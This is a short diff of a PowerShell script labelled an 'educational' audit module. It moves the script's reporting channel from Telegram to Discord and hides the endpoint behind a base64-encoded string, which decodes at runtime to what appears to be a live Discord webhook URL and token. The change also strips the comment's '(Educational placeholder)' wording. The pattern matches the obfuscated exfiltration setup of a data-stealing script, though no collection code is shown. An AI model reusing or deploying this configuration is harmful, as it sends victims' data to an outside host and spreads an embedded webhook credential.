@@ -1,14 +1,14 @@
 # ==============================================================================
 # AUDIT SCRIPT - EDUCATIONAL MODULE
-# Version: 2.3.3
-# Migration: Telegram -> Discord
+# Version: 2.3.4
+# Migration: Telegram -> Discord (B64 Config)
 # ==============================================================================
 
 # ========== CONFIGURATION ==========
 $VerboseMode = $true
-$AuditVersion = '2.3.3'
+$AuditVersion = '2.3.4'
 
-# Encoded Discord Webhook (Educational placeholder)
+# Encoded Discord Webhook
 $Channel_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
 $Channel_URI = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Channel_B64))
 
